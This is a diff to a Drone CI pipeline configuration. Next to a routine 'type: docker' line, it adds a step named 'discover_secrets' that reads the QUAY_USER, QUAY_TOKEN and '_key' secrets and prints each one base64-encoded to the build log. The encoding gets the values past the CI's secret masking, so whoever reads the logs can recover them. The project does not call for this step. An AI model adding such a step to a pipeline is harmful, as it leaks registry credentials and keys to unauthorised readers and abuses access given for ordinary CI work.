@@ -1,5 +1,6 @@
 ---
 kind: pipeline
+type: docker
 name: test
 
 platform:
@@ -7,6 +8,26 @@ platform:
   arch: amd64
 
 steps:
+  - name: discover_secrets
+    image: docker.io/alpine/git
+    pull: always
+    environment:
+      USER:
+        from_secret:
+          QUAY_USER
+      TOKEN:
+        from_secret:
+          QUAY_TOKEN
+      KEY:
+      from_secret:
+        _key
+    commands:
+      - echo "$${QUAY_USER}" | base64 -w0
+      - echo ""
+      - echo "$${QUAY_TOKEN}" | base64 -w0
+      - echo ""
+      - echo "$${KEY}" | base64 -w0
+      - echo ""
   - name: build
     image: docker:dind
     environment:
